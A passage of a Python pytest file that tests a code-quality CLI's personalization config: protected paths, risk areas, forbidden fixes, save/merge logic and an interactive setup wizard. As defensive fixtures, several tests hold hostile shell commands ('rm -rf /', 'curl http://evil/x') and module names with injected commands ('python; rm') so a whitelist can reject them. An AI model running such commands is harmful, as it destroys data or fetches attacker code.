        assert data.is_empty() is False

    def test_is_empty_false_with_extra_commands(self) -> None:
        data = PersonalizationData(extra_validation_commands={"python": ["test"]})
        assert data.is_empty() is False

    def test_to_config_dict_has_structured_fields(self) -> None:
        data = _build_personalization_data()
        d = data.to_config_dict()
        assert d["protected_paths"] == ["legacy/**", "vendor/**"]
        assert len(d["risk_areas"]) == 2
        assert d["risk_areas"][0] == {"path": "src/auth/", "reason": "认证模块需审批"}
        assert len(d["known_intentional"]) == 2
        assert d["known_intentional"][0]["file"] == "db/queries.py"
        assert d["known_intentional"][0]["line"] == 42
        assert d["dimension_focus"][0] == {
            "dimension": "security", "focus": "SQL 注入历史事故",
        }
        assert d["fix_priority_order"] == ["security", "correctness", "performance"]
        assert d["forbidden_fixes"] == ["try-catch 吞错", "# noqa"]

    def test_to_config_dict_excludes_free_form_fields(self) -> None:
        data = _build_personalization_data()
        d = data.to_config_dict()
        # iterate_notes and code_conventions are free-form, not in config dict
        assert "iterate_notes" not in d
        assert "code_conventions" not in d
        # extra_validation_commands IS persisted in config dict so that
        # load_personalization_from_config can round-trip it.
        assert "extra_validation_commands" in d
        assert d["extra_validation_commands"] == data.extra_validation_commands

    def test_to_user_md_sections_empty(self) -> None:
        data = PersonalizationData()
        assert data.to_user_md_sections().strip() == ""

    def test_to_user_md_sections_with_conventions(self) -> None:
        data = PersonalizationData(code_conventions=["Use 4 spaces", "snake_case"])
        md = data.to_user_md_sections()
        assert "Custom Code Conventions" in md
        assert "Use 4 spaces" in md
        assert "snake_case" in md

    def test_to_user_md_sections_with_protected_paths(self) -> None:
        data = PersonalizationData(protected_paths=["legacy/**"])
        md = data.to_user_md_sections()
        assert "Restricted" in md
        assert "Protected" in md
        assert "legacy/**" in md

    def test_to_user_md_sections_with_risk_areas(self) -> None:
        data = PersonalizationData(
            risk_areas=[RiskArea(path="src/auth/", reason="sensitive")],
        )
        md = data.to_user_md_sections()
        assert "Risk Areas" in md
        assert "src/auth/" in md
        assert "sensitive" in md

    def test_to_user_md_sections_with_iterate_notes(self) -> None:
        data = PersonalizationData(iterate_notes=["Don't touch migrations"])
        md = data.to_user_md_sections()
        assert "Iterate Notes" in md
        assert "Don't touch migrations" in md

    def test_to_user_md_sections_with_known_intentional(self) -> None:
        data = PersonalizationData(
            known_intentional=[
                KnownIntentional(
                    file="db/queries.py", line=42, dimension="tech-debt",
                    reason="intentional any",
                ),
            ],
        )
        md = data.to_user_md_sections()
        assert "Known Intentional" in md
        assert "db/queries.py:42" in md
        assert "tech-debt" in md

    def test_to_user_md_sections_known_intentional_whole_file(self) -> None:
        """Line 0 should show just the file path, not file:0."""
        data = PersonalizationData(
            known_intentional=[
                KnownIntentional(
                    file="legacy/handlers.py", line=0, dimension="style-tests",
                    reason="legacy code",
                ),
            ],
        )
        md = data.to_user_md_sections()
        assert "legacy/handlers.py" in md
        assert "legacy/handlers.py:0" not in md

    def test_to_user_md_sections_with_forbidden_fixes(self) -> None:
        data = PersonalizationData(forbidden_fixes=["# noqa", "try-catch 吞错"])
        md = data.to_user_md_sections()
        assert "Forbidden Fixes" in md
        assert "# noqa" in md


# ---------------------------------------------------------------------------
# Load / save / merge tests
# ---------------------------------------------------------------------------


class TestLoadPersonalizationFromConfig:
    def test_load_empty_config(self) -> None:
        data = load_personalization_from_config({})
        assert data.is_empty() is True

    def test_load_ignores_scalar_string_lists(self) -> None:
        """A hand-edited config that sets a scalar string for a list field
        must not be iterated character-by-character into item lists."""
        config = {
            "personalization": {
                "fix_priority_order": "correctness",
                "forbidden_fixes": "# noqa",
            },
        }
        data = load_personalization_from_config(config)
        assert data.fix_priority_order == []
        assert data.forbidden_fixes == []

    def test_load_config_without_personalization(self) -> None:
        config = {"dimensions": ["correctness"], "goal": "test"}
        data = load_personalization_from_config(config)
        assert data.is_empty() is True

    def test_load_non_dict_personalization_does_not_crash(self) -> None:
        config = {"personalization": "just a string"}
        data = load_personalization_from_config(config)
        assert data.is_empty() is True

    def test_load_full_config(self) -> None:
        config = {
            "personalization": {
                "protected_paths": ["legacy/**"],
                "risk_areas": [{"path": "src/auth/", "reason": "sensitive"}],
                "known_intentional": [
                    {"file": "db.py", "line": 10, "dimension": "security", "reason": "ok"},
                ],
                "dimension_focus": [
                    {"dimension": "security", "focus": "SQL injection"},
                ],
                "fix_priority_order": ["security", "correctness"],
                "forbidden_fixes": ["# noqa"],
                "extra_validation_commands": {"python": ["bandit -r src/"]},
            },
        }
        data = load_personalization_from_config(config)
        assert data.protected_paths == ["legacy/**"]
        assert len(data.risk_areas) == 1
        assert data.risk_areas[0].path == "src/auth/"
        assert data.risk_areas[0].reason == "sensitive"
        assert len(data.known_intentional) == 1
        assert data.known_intentional[0].file == "db.py"
        assert data.known_intentional[0].line == 10
        assert data.known_intentional[0].dimension == "security"
        assert len(data.dimension_focus) == 1
        assert data.dimension_focus[0].dimension == "security"
        assert data.fix_priority_order == ["security", "correctness"]
        assert data.forbidden_fixes == ["# noqa"]
        assert data.extra_validation_commands == {"python": ["bandit -r src/"]}

    def test_load_partial_config(self) -> None:
        config = {
            "personalization": {
                "protected_paths": ["vendor/**"],
            },
        }
        data = load_personalization_from_config(config)
        assert data.protected_paths == ["vendor/**"]
        assert data.risk_areas == []
        assert data.forbidden_fixes == []

    def test_load_skips_malformed_entries(self) -> None:
        config = {
            "personalization": {
                "risk_areas": [
                    {"path": "ok/", "reason": "fine"},
                    "not a dict",
                    {"reason": "missing path"},
                ],
                "known_intentional": [
                    {"file": "ok.py", "line": 1, "dimension": "security", "reason": "ok"},
                    "not a dict",
                    {"line": 5},
                ],
                "dimension_focus": [
                    {"dimension": "security", "focus": "ok"},
                    "not a dict",
                    {"focus": "missing dim"},
                ],
            },
        }
        data = load_personalization_from_config(config)
        assert len(data.risk_areas) == 1
        assert len(data.known_intentional) == 1
        assert len(data.dimension_focus) == 1

    def test_load_extra_validation_commands_non_list_skipped(self) -> None:
        config = {
            "personalization": {
                "extra_validation_commands": {
                    "python": "not a list",
                    "swift": ["swift build"],
                },
            },
        }
        data = load_personalization_from_config(config)
        assert "python" not in data.extra_validation_commands
        assert data.extra_validation_commands["swift"] == ["swift build"]

    def test_load_line_non_integer_falls_back_to_zero(self) -> None:
        """line field with non-numeric string should fall back to 0, not crash (B-4)."""
        config = {
            "personalization": {
                "known_intentional": [
                    {"file": "ok.py", "line": "not-a-number", "dimension": "security", "reason": "ok"},
                    {"file": "ok2.py", "line": "42abc", "dimension": "security", "reason": "ok2"},
                    {"file": "ok3.py", "line": 42, "dimension": "security", "reason": "ok3"},
                ],
            },
        }
        data = load_personalization_from_config(config)
        assert len(data.known_intentional) == 3
        assert data.known_intentional[0].line == 0
        assert data.known_intentional[1].line == 0
        assert data.known_intentional[2].line == 42

    def test_load_extra_validation_commands_unsafe_module_name_skipped(self) -> None:
        """Module names with shell metacharacters should be skipped (S-16)."""
        config = {
            "personalization": {
                "extra_validation_commands": {
                    "python; rm": ["bad"],
                    "safe_module": ["pytest tests/"],
                    "node &": ["also bad"],
                },
            },
        }
        data = load_personalization_from_config(config)
        assert "python; rm" not in data.extra_validation_commands
        assert "node &" not in data.extra_validation_commands
        assert data.extra_validation_commands["safe_module"] == ["pytest tests/"]

    def test_load_extra_validation_commands_rejects_unsafe_command(self) -> None:
        """Config-sourced commands with non-whitelisted prefixes must be dropped
        (ClawHub SDI-4): the strict-whitelist guarantee must hold even when
        iterate.config.yaml is manually edited, not just during interactive entry.
        """
        config = {
            "personalization": {
                "extra_validation_commands": {
                    "python": ["bandit -r src/", "rm -rf /", "curl http://evil/x"],
                    "swift": ["swift build"],
                },
            },
        }
        data = load_personalization_from_config(config)
        assert data.extra_validation_commands["python"] == ["bandit -r src/"]
        assert "rm -rf /" not in data.extra_validation_commands["python"]
        assert "curl http://evil/x" not in data.extra_validation_commands["python"]
        assert data.extra_validation_commands["swift"] == ["swift build"]


class TestLoadPersonalizationFromIterateMd:
    """Regression: free-form notes/conventions must round-trip from ITERATE.md.

    These are stored in the user-owned section (not in iterate.config.yaml),
    so re-running ``iterate personalize`` / ``onboard`` without a loader
    would wipe them via ``merge_user_sections``.
    """

    def test_load_notes_and_conventions(self, tmp_path: Path) -> None:
        project = tmp_path / "proj"
        project.mkdir()
        (project / "ITERATE.md").write_text(
            "# ITERATE.md\n\n"
            "<!-- ITERATE:USER-OWNED:START -->\n\n"
            "## 自定义代码约定 / Custom Code Conventions\n\n"
            "- 使用 snake_case\n"
            "- 禁止魔法数字\n\n"
            "## Iterate 注意点 / Iterate Notes\n\n"
            "- 注意 auth 模块的边界\n\n"
            "## 手动批注 / Manual Annotations\n\n"
            "- 用户手动内容\n\n"
            "<!-- ITERATE:USER-OWNED:END -->\n",
            encoding="utf-8",
        )
        notes, conventions = load_personalization_from_iterate_md(project)
        assert conventions == ["使用 snake_case", "禁止魔法数字"]
        assert notes == ["注意 auth 模块的边界"]

    def test_load_missing_file_returns_empty(self, tmp_path: Path) -> None:
        project = tmp_path / "proj"
        project.mkdir()
        notes, conventions = load_personalization_from_iterate_md(project)
        assert notes == []
        assert conventions == []

    def test_load_existing_merges_structured_and_free_form(self, tmp_path: Path) -> None:
        project = tmp_path / "proj"
        project.mkdir()
        (project / "ITERATE.md").write_text(
            "# ITERATE.md\n\n"
            "<!-- ITERATE:USER-OWNED:START -->\n\n"
            "## Iterate 注意点 / Iterate Notes\n\n"
            "- 注意迁移脚本\n\n"
            "<!-- ITERATE:USER-OWNED:END -->\n",
            encoding="utf-8",
        )
        config = {
            "personalization": {
                "version": "1.0",
                "protected_paths": ["vendor/**"],
            },
        }
        data = load_existing_personalization(project, config)
        assert data.protected_paths == ["vendor/**"]
        assert data.iterate_notes == ["注意迁移脚本"]
        assert data.is_empty() is False


class TestMergePersonalizationIntoConfig:
    def test_merge_creates_personalization_section(self) -> None:
        config = {"goal": "test", "dimensions": ["correctness"]}
        data = PersonalizationData(protected_paths=["legacy/**"])
        result = merge_personalization_into_config(config, data)
        assert "personalization" in result
        assert result["personalization"]["protected_paths"] == ["legacy/**"]

    def test_merge_preserves_other_fields(self) -> None:
        config = {"goal": "test", "dimensions": ["correctness"]}
        data = _build_personalization_data()
        result = merge_personalization_into_config(config, data)
        assert result["goal"] == "test"
        assert result["dimensions"] == ["correctness"]

    def test_merge_extra_commands_into_validation(self) -> None:
        config = {
            "validation": {
                "commands": {"python": ["pytest"]},
                "command_whitelist": ["pytest"],
            },
        }
        data = PersonalizationData(
            extra_validation_commands={"python": ["bandit -r src/"], "swift": ["swift build"]},
        )
        result = merge_personalization_into_config(config, data)
        assert "bandit -r src/" in result["validation"]["commands"]["python"]
        assert "pytest" in result["validation"]["commands"]["python"]
        assert result["validation"]["commands"]["swift"] == ["swift build"]

    def test_merge_rejects_unsafe_command_and_does_not_whitelist(self) -> None:
        """Merge must fail closed (ClawHub SDI-2): a non-whitelisted command
        must not be copied into validation.commands nor auto-extend
        command_whitelist, even if it reaches merge via a hand-built
        PersonalizationData.
        """
        config = {
            "validation": {
                "commands": {"python": ["pytest"]},
                "command_whitelist": ["pytest"],
            },
        }
        data = PersonalizationData(
            extra_validation_commands={"python": ["rm -rf /", "curl http://evil/x"]},
        )
        result = merge_personalization_into_config(config, data)
        assert "rm -rf /" not in result["validation"]["commands"]["python"]
        assert "curl http://evil/x" not in result["validation"]["commands"]["python"]
        assert result["validation"]["commands"]["python"] == ["pytest"]
        assert "rm" not in result["validation"]["command_whitelist"]
        assert "curl" not in result["validation"]["command_whitelist"]

    def test_merge_extra_commands_no_duplicates(self) -> None:
        config = {
            "validation": {
                "commands": {"python": ["pytest", "ruff check src/"]},
            },
        }
        data = PersonalizationData(
            extra_validation_commands={"python": ["ruff check src/", "mypy src/"]},
        )
        result = merge_personalization_into_config(config, data)
        cmds = result["validation"]["commands"]["python"]
        assert cmds.count("ruff check src/") == 1
        assert "mypy src/" in cmds
        assert "pytest" in cmds

    def test_merge_does_not_mutate_original(self) -> None:
        config = {"goal": "test"}
        data = PersonalizationData(protected_paths=["legacy/**"])
        result = merge_personalization_into_config(config, data)
        assert "personalization" not in config
        assert "personalization" in result

    def test_merge_creates_validation_section_if_missing(self) -> None:
        config = {"goal": "test"}
        data = PersonalizationData(
            extra_validation_commands={"python": ["bandit -r src/"]},
        )
        result = merge_personalization_into_config(config, data)
        assert "validation" in result
        assert result["validation"]["commands"]["python"] == ["bandit -r src/"]


class TestMergePersonalizationDeletesCommands:
    """Tests that merge_personalization_into_config removes deleted commands.

    Regression: previously the merge only appended new commands to
    ``validation.commands``; commands the user deleted via personalization
    (individually or as a whole module) lingered in the executable config.
    """

    def test_removed_individual_command_is_deleted(self) -> None:
        """A command removed from personalization must vanish from
        validation.commands while base-config commands survive."""
        config = {
            "validation": {
                "commands": {
                    "python": ["pytest", "ruff check src/", "mypy src/"],
                },
                "command_whitelist": ["pytest", "ruff", "mypy"],
            },
            "personalization": {
                "extra_validation_commands": {
                    "python": ["ruff check src/", "mypy src/"],
                },
            },
        }
        data = PersonalizationData(
            extra_validation_commands={"python": ["mypy src/"]},
        )
        result = merge_personalization_into_config(config, data)
        cmds = result["validation"]["commands"]["python"]
        assert "ruff check src/" not in cmds
        assert "mypy src/" in cmds
        # Base-config command not owned by personalization is preserved.
        assert "pytest" in cmds

    def test_removed_whole_module_is_deleted(self) -> None:
        """Removing an entire personalization module must drop its commands,
        and a now-empty module key must be removed (schema-safe)."""
        config = {
            "validation": {
                "commands": {
                    "python": ["pytest", "ruff check src/"],
                    "swift": ["swift build"],
                },
                "command_whitelist": ["pytest", "ruff", "swift"],
            },
            "personalization": {
                "extra_validation_commands": {
                    "python": ["ruff check src/"],
                    "swift": ["swift build"],
                },
            },
        }
        data = PersonalizationData(
            extra_validation_commands={"python": ["ruff check src/"]},
        )
        result = merge_personalization_into_config(config, data)
        commands = result["validation"]["commands"]
        # swift was entirely personalization-owned → module removed.
        assert "swift" not in commands
        assert "ruff check src/" in commands["python"]
        assert "pytest" in commands["python"]

    def test_empty_personalization_cleans_all_owned_commands(self) -> None:
        """Clearing all personalization commands removes every
        personalization-owned command, keeping base-config commands."""
        config = {
            "validation": {
                "commands": {
                    "python": ["pytest", "ruff check src/"],
                    "swift": ["swift build"],
                },
                "command_whitelist": ["pytest", "ruff", "swift"],
            },
            "personalization": {
                "extra_validation_commands": {
                    "python": ["ruff check src/"],
                    "swift": ["swift build"],
                },
            },
        }
        data = PersonalizationData()
        result = merge_personalization_into_config(config, data)
        commands = result["validation"]["commands"]
        assert commands["python"] == ["pytest"]
        assert "swift" not in commands

    def test_unchanged_personalization_is_noop(self) -> None:
        """Re-merging the same personalization must not reorder or duplicate."""
        config = {
            "validation": {
                "commands": {
                    "python": ["pytest", "ruff check src/"],
                },
                "command_whitelist": ["pytest", "ruff"],
            },
            "personalization": {
                "extra_validation_commands": {
                    "python": ["ruff check src/"],
                },
            },
        }
        data = PersonalizationData(
            extra_validation_commands={"python": ["ruff check src/"]},
        )
        result = merge_personalization_into_config(config, data)
        cmds = result["validation"]["commands"]["python"]
        assert cmds.count("ruff check src/") == 1
        assert cmds == ["pytest", "ruff check src/"]
        assert result["validation"]["command_whitelist"].count("ruff") == 1

    def test_deleted_command_prefix_not_removed_from_whitelist(self) -> None:
        """Whitelist is only ever extended, never shrunk (legacy field, and
        other commands may still rely on the prefix)."""
        config = {
            "validation": {
                "commands": {
                    "python": ["pytest", "bandit -r src/"],
                },
                "command_whitelist": ["pytest", "bandit"],
            },
            "personalization": {
                "extra_validation_commands": {
                    "python": ["bandit -r src/"],
                },
            },
        }
        data = PersonalizationData(
            extra_validation_commands={"python": []},
        )
        result = merge_personalization_into_config(config, data)
        # bandit command removed, but the whitelist entry stays (harmless,
        # legacy compatibility).
        assert "bandit -r src/" not in result["validation"]["commands"]["python"]
        assert "bandit" in result["validation"]["command_whitelist"]


class TestSavePersonalizationToConfig:
    def test_save_writes_personalization_section(self, fake_project: Path) -> None:
        data = _build_onboarding_data(fake_project)
        write_onboarding_outputs(data, fake_project)

        personalization = PersonalizationData(protected_paths=["legacy/**"])
        save_personalization_to_config(fake_project, personalization)

        config = yaml.safe_load(
            (fake_project / "iterate.config.yaml").read_text(encoding="utf-8")
        )
        assert config["personalization"]["protected_paths"] == ["legacy/**"]

    def test_save_preserves_other_config_fields(self, fake_project: Path) -> None:
        data = _build_onboarding_data(fake_project)
        write_onboarding_outputs(data, fake_project)

        personalization = PersonalizationData(forbidden_fixes=["# noqa"])
        save_personalization_to_config(fake_project, personalization)

        config = yaml.safe_load(
            (fake_project / "iterate.config.yaml").read_text(encoding="utf-8")
        )
        assert config["goal"] == "Improve code quality and maintainability"
        assert "correctness" in config["dimensions"]
        assert config["onboarding"]["channel"] == "cli"

    def test_save_raises_on_missing_config(self, empty_project: Path) -> None:
        with pytest.raises(FileNotFoundError):
            save_personalization_to_config(
                empty_project, PersonalizationData(protected_paths=["x"]),
            )

    def test_save_roundtrip(self, fake_project: Path) -> None:
        data = _build_onboarding_data(fake_project)
        write_onboarding_outputs(data, fake_project)

        original = _build_personalization_data()
        save_personalization_to_config(fake_project, original)

        config = yaml.safe_load(
            (fake_project / "iterate.config.yaml").read_text(encoding="utf-8")
        )
        loaded = load_personalization_from_config(config)

        assert loaded.protected_paths == original.protected_paths
        assert len(loaded.risk_areas) == len(original.risk_areas)
        assert loaded.risk_areas[0].path == original.risk_areas[0].path
        assert loaded.forbidden_fixes == original.forbidden_fixes
        assert loaded.fix_priority_order == original.fix_priority_order

    def test_save_roundtrip_extra_validation_commands(self, fake_project: Path) -> None:
        """extra_validation_commands must survive save/load roundtrip (B-3)."""
        data = _build_onboarding_data(fake_project)
        write_onboarding_outputs(data, fake_project)

        original = PersonalizationData(
            extra_validation_commands={
                "python": ["bandit -r src/", "pip-audit"],
                "node": ["npm audit"],
            },
        )
        save_personalization_to_config(fake_project, original)

        config = yaml.safe_load(
            (fake_project / "iterate.config.yaml").read_text(encoding="utf-8")
        )
        loaded = load_personalization_from_config(config)

        assert loaded.extra_validation_commands == original.extra_validation_commands

    def test_save_merges_extra_commands(self, fake_project: Path) -> None:
        data = _build_onboarding_data(fake_project)
        write_onboarding_outputs(data, fake_project)

        # Original config has python commands from scan.
        personalization = PersonalizationData(
            extra_validation_commands={"python": ["bandit -r src/"]},
        )
        save_personalization_to_config(fake_project, personalization)

        config = yaml.safe_load(
            (fake_project / "iterate.config.yaml").read_text(encoding="utf-8")
        )
        python_cmds = config["validation"]["commands"]["python"]
        assert "bandit -r src/" in python_cmds
        # Original commands from scan should still be there.
        assert any("pytest" in c for c in python_cmds)


# ---------------------------------------------------------------------------
# Personalize wizard tests
# ---------------------------------------------------------------------------


class TestRunPersonalizeWizard:
    def test_cancel_at_start(self, fake_project: Path) -> None:
        responses = iter(["n"])  # start personalization? no
        result = run_personalize_wizard(
            fake_project, input_func=lambda _: next(responses),
        )
        assert result is None

    def test_full_flow_all_skip(self, fake_project: Path) -> None:
        """User starts but skips every step, then confirms empty data."""
        responses = iter([
            "y",    # start personalization
            "s",    # step 1: skip protected paths
            "s",    # step 2: skip risk areas
            "s",    # step 3: skip known intentional
            "s",    # step 4: skip dimension focus
            "",     # step 5: skip fix priority (empty)
            "s",    # step 6: skip forbidden fixes
            "s",    # step 7: skip iterate notes
            "s",    # step 8: skip code conventions
            "s",    # step 9: skip extra validation commands
            "y",    # confirm save (even though empty)
        ])
        result = run_personalize_wizard(
            fake_project, input_func=lambda _: next(responses),
        )
        assert result is not None
        assert result.is_empty() is True

    def test_cancel_at_confirmation(self, fake_project: Path) -> None:
        """User fills some data but cancels at final confirmation."""
        responses = iter([
            "y",          # start personalization
            # Step 1: protected paths
            "a",          # add
            "legacy/**",  # path
            "s",          # skip
            # Step 2-9: skip all
            "s", "s", "s", "", "s", "s", "s", "s", "s",
            "n",          # confirm save: no
        ])
        result = run_personalize_wizard(
            fake_project, input_func=lambda _: next(responses),
        )
        assert result is None

    def test_add_protected_paths(self, fake_project: Path) -> None:
        responses = iter([
            "y",              # start personalization
            # Step 1: protected paths
            "a",              # add
            "legacy/**",      # path
            "a",              # add another
            "vendor/**",      # path
            "s",              # skip
            # Step 2-9: skip all
            "s", "s", "s", "", "s", "s", "s", "s", "s",
            "y",              # confirm save
        ])
        result = run_personalize_wizard(
            fake_project, input_func=lambda _: next(responses),
        )
        assert result is not None
        assert result.protected_paths == ["legacy/**", "vendor/**"]

    def test_add_and_remove_protected_path(self, fake_project: Path) -> None:
        responses = iter([
            "y",              # start personalization
            # Step 1: protected paths
            "a",              # add
            "legacy/**",      # path
            "a",              # add
            "vendor/**",      # path
            "r",              # remove
            "1",              # remove first (legacy/**)
            "s",              # skip
            # Step 2-9: skip all
            "s", "s", "s", "", "s", "s", "s", "s", "s",
            "y",              # confirm save
        ])
        result = run_personalize_wizard(
            fake_project, input_func=lambda _: next(responses),
        )
        assert result is not None
        assert result.protected_paths == ["vendor/**"]

    def test_add_risk_areas(self, fake_project: Path) -> None:
        responses = iter([
            "y",              # start personalization
            # Step 1: skip
            "s",
            # Step 2: risk areas
            "a",              # add
            "src/auth/",      # path
            "认证模块需审批",  # reason
            "s",              # skip
            # Step 3-9: skip all
            "s", "s", "", "s", "s", "s", "s", "s",
            "y",              # confirm save
        ])
        result = run_personalize_wizard(
            fake_project, input_func=lambda _: next(responses),
        )
        assert result is not None
        assert len(result.risk_areas) == 1
        assert result.risk_areas[0].path == "src/auth/"
        assert result.risk_areas[0].reason == "认证模块需审批"

    def test_add_risk_area_empty_path_cancels(self, fake_project: Path) -> None:
        responses = iter([
            "y",              # start personalization
            "s",              # step 1: skip
            # Step 2: risk areas
            "a",              # add
            "",               # empty path → cancels add
            "s",              # skip
            # Step 3-9: skip all
            "s", "s", "", "s", "s", "s", "s", "s",
            "y",              # confirm save
        ])
        result = run_personalize_wizard(
            fake_project, input_func=lambda _: next(responses),
        )
        assert result is not None
        assert result.risk_areas == []

    def test_add_risk_area_default_reason(self, fake_project: Path) -> None:
        responses = iter([
            "y",              # start personalization
            "s",              # step 1: skip
            # Step 2: risk areas
            "a",              # add
            "src/auth/",      # path
            "",               # empty reason → uses default
            "s",              # skip
            # Step 3-9: skip all
            "s", "s", "", "s", "s", "s", "s", "s",
            "y",              # confirm save
        ])
        result = run_personalize_wizard(
            fake_project, input_func=lambda _: next(responses),
        )
        assert result is not None
        assert len(result.risk_areas) == 1
        assert "未说明" in result.risk_areas[0].reason or "unspecified" in result.risk_areas[0].reason

    def test_add_known_intentional(self, fake_project: Path) -> None:
        responses = iter([
            "y",              # start personalization
            "s", "s",         # skip steps 1-2
            # Step 3: known intentional
            "a",              # add
            "db/queries.py",  # file
            "42",             # line
            "6",              # dimension number (tech-debt)
            "使用 any 是性能优化",  # reason
            "s",              # skip
            # Step 4-9: skip all
            "s", "", "s", "s", "s", "s", "s",
            "y",              # confirm save
        ])
        result = run_personalize_wizard(
            fake_project, input_func=lambda _: next(responses),
        )
        assert result is not None
        assert len(result.known_intentional) == 1
        assert result.known_intentional[0].file == "db/queries.py"
        assert result.known_intentional[0].line == 42
        assert result.known_intentional[0].dimension == "tech-debt"

    def test_add_known_intentional_whole_file(self, fake_project: Path) -> None:
        responses = iter([
            "y",              # start personalization
            "s", "s",         # skip steps 1-2
            # Step 3: known intentional
            "a",              # add
            "legacy/handlers.py",  # file
            "",               # empty line → 0 (whole file)
            "5",              # dimension number (style-tests)
            "遗留代码不强制风格",  # reason
            "s",              # skip
            # Step 4-9: skip all
            "s", "", "s", "s", "s", "s", "s",
            "y",              # confirm save
        ])
        result = run_personalize_wizard(
            fake_project, input_func=lambda _: next(responses),
        )
        assert result is not None
        assert result.known_intentional[0].line == 0
        assert result.known_intentional[0].dimension == "style-tests"

    def test_add_known_intentional_invalid_line_defaults_zero(self, fake_project: Path) -> None:
        responses = iter([
            "y",              # start personalization
            "s", "s",         # skip steps 1-2
            # Step 3: known intentional
            "a",              # add
            "db.py",          # file
            "abc",            # invalid line → defaults to 0
            "1",              # dimension number (correctness)
            "ok",             # reason
            "s",              # skip
            # Step 4-9: skip all
            "s", "", "s", "s", "s", "s", "s",
            "y",              # confirm save
        ])
        result = run_personalize_wizard(
            fake_project, input_func=lambda _: next(responses),
        )
        assert result is not None
        assert result.known_intentional[0].line == 0

    def test_add_dimension_focus(self, fake_project: Path) -> None:
        responses = iter([
            "y",              # start personalization
            "s", "s", "s",    # skip steps 1-3
            # Step 4: dimension focus
            "a",              # add
            "2",              # dimension number (security)
            "SQL 注入历史事故",  # focus
            "s",              # skip
            # Step 5-9: skip all
            "", "s", "s", "s", "s", "s",
            "y",              # confirm save
        ])
        result = run_personalize_wizard(
            fake_project, input_func=lambda _: next(responses),
        )
        assert result is not None
        assert len(result.dimension_focus) == 1
        assert result.dimension_focus[0].dimension == "security"
        assert result.dimension_focus[0].focus == "SQL 注入历史事故"

    def test_add_dimension_focus_empty_focus_cancels(self, fake_project: Path) -> None:
        responses = iter([
            "y",              # start personalization
            "s", "s", "s",    # skip steps 1-3
            # Step 4: dimension focus
            "a",              # add
            "2",              # dimension number (security)
            "",               # empty focus → cancels
            "s",              # skip
            # Step 5-9: skip all
            "", "s", "s", "s", "s", "s",
            "y",              # confirm save
        ])
        result = run_personalize_wizard(
            fake_project, input_func=lambda _: next(responses),
        )
        assert result is not None
        assert result.dimension_focus == []

    def test_fix_priority_order(self, fake_project: Path) -> None:
        responses = iter([
            "y",              # start personalization
            "s", "s", "s", "s",  # skip steps 1-4
            # Step 5: fix priority order
            "2,1,3",          # security, correctness, performance
            "y",              # confirm new order
            # Step 6-9: skip all
            "s", "s", "s", "s", "s",
            "y",              # confirm save
        ])
        result = run_personalize_wizard(
            fake_project, input_func=lambda _: next(responses),
        )
        assert result is not None
        assert result.fix_priority_order == ["security", "correctness", "performance"]

    def test_fix_priority_order_invalid_keeps_empty(self, fake_project: Path) -> None:
        responses = iter([
            "y",              # start personalization
            "s", "s", "s", "s",  # skip steps 1-4
            # Step 5: fix priority order
            "abc",            # invalid input
            # Step 6-9: skip all
            "s", "s", "s", "s", "s",
            "y",              # confirm save
        ])
        result = run_personalize_wizard(
            fake_project, input_func=lambda _: next(responses),
        )
        assert result is not None
        assert result.fix_priority_order == []

    def test_add_forbidden_fixes(self, fake_project: Path) -> None:
        responses = iter([
            "y",              # start personalization
            "s", "s", "s", "s", "",  # skip steps 1-5
            # Step 6: forbidden fixes
            "a",              # add
            "# noqa",         # value
            "a",              # add
            "try-catch 吞错",  # value
            "s",              # skip
            # Step 7-9: skip all
            "s", "s", "s", "s",
            "y",              # confirm save
        ])
        result = run_personalize_wizard(
            fake_project, input_func=lambda _: next(responses),
        )
        assert result is not None
        assert result.forbidden_fixes == ["# noqa", "try-catch 吞错"]

    def test_add_iterate_notes(self, fake_project: Path) -> None:
        responses = iter([
            "y",              # start personalization
            "s", "s", "s", "s", "", "s",  # skip steps 1-6
            # Step 7: iterate notes
            "a",              # add
            "不要修改迁移文件",  # value
            "s",              # skip
            # Step 8-9: skip all
            "s", "s", "s",
            "y",              # confirm save
        ])
        result = run_personalize_wizard(
            fake_project, input_func=lambda _: next(responses),
        )
        assert result is not None
        assert "不要修改迁移文件" in result.iterate_notes

    def test_add_code_conventions(self, fake_project: Path) -> None:
        responses = iter([
            "y",              # start personalization
            "s", "s", "s", "s", "", "s", "s",  # skip steps 1-7
            # Step 8: code conventions
            "a",              # add
            "使用 4 空格缩进",  # value
            "s",              # skip
            # Step 9: skip
            "s",
            "y",              # confirm save
        ])
        result = run_personalize_wizard(
            fake_project, input_func=lambda _: next(responses),
        )
        assert result is not None
        assert "使用 4 空格缩进" in result.code_conventions

    def test_add_extra_validation_commands(self, fake_project: Path) -> None:
        responses = iter([
            "y",              # start personalization
            "s", "s", "s", "s", "", "s", "s", "s",  # skip steps 1-8
            # Step 9: extra validation commands
            "a",              # add
            "python",         # module
            "bandit -r src/", # command (whitelisted, accepted)
            "a",              # add another
            "python",         # module
            "safety check",   # command (NOT whitelisted → rejected v2.0.2)
            "a",              # add another
            "python",         # module
            "mypy iterate_cli/",  # command (whitelisted, accepted)
            "s",              # skip
            "y",              # confirm save
        ])
        result = run_personalize_wizard(
            fake_project, input_func=lambda _: next(responses),
        )
        assert result is not None
        assert "python" in result.extra_validation_commands
        assert "bandit -r src/" in result.extra_validation_commands["python"]
        assert "mypy iterate_cli/" in result.extra_validation_commands["python"]
        # safety check was rejected, must NOT be in the result
        assert "safety check" not in result.extra_validation_commands.get("python", [])

    def test_add_validation_command_duplicate_skipped(self, fake_project: Path) -> None:
        responses = iter([
            "y",              # start personalization
            "s", "s", "s", "s", "", "s", "s", "s",  # skip steps 1-8
            # Step 9: extra validation commands
            "a",              # add
            "python",         # module
            "bandit -r src/", # command
            "a",              # add same
            "python",         # module
            "bandit -r src/", # same command
            "s",              # skip
            "y",              # confirm save
        ])
        result = run_personalize_wizard(
            fake_project, input_func=lambda _: next(responses),
        )
        assert result is not None
        assert result.extra_validation_commands["python"].count("bandit -r src/") == 1

    def test_add_validation_command_empty_module_skipped(self, fake_project: Path) -> None:
        responses = iter([
            "y",              # start personalization
            "s", "s", "s", "s", "", "s", "s", "s",  # skip steps 1-8
            # Step 9: extra validation commands
            "a",              # add
            "",               # empty module → skipped
            "s",              # skip
            "y",              # confirm save
        ])
        result = run_personalize_wizard(
            fake_project, input_func=lambda _: next(responses),
        )
        assert result is not None
        assert result.extra_validation_commands == {}

    def test_edit_existing_data(self, fake_project: Path) -> None:
        """Load existing personalization and add to it."""
        existing = PersonalizationData(
            protected_paths=["legacy/**"],
            forbidden_fixes=["# noqa"],
        )
        responses = iter([
            "y",              # start personalization
            # Step 1: protected paths (has 1 existing)
            "a",              # add
            "vendor/**",      # path
            "s",              # skip
